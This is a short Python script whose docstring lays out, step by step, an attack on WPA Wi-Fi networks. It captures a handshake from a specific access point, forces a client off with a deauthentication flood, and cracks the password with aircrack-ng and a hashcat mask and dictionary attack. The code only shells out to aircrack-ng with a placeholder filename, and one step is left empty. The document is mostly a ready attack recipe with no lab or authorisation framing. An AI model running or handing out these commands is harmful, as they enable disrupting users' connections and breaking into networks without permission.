#!/usr/bin/env python

import subprocess as s

interface = "wlan0"
airmon_interface = "wlan0mon"
"""
1.
Run airodump-ng on all interfaces around you
python airmon-ng.py   = Easy setup. After setup, run airodump-ng
airodump-ng wlan0mon
2.
airodump-ng --bssid 20:4E:7F:96:16:AA --channel 11 --write wpa_handshake wlan0mon
3.
aireplay-ng --deauth 4 -a 20:4E:7F:96:16:AA -c 82:B9:8B:C9:52:69 wlan0mon
4.
Optional.
5.
Use hashcat to crack password.
aircrack-ng FILE.cap -J NewFileName
6.
hashcat -m 2500 -a 6 FILE.hccap NetgearKiller.dict ?d?d?d

"""

s.call("aircrack-ng FILENAME", shell=True)
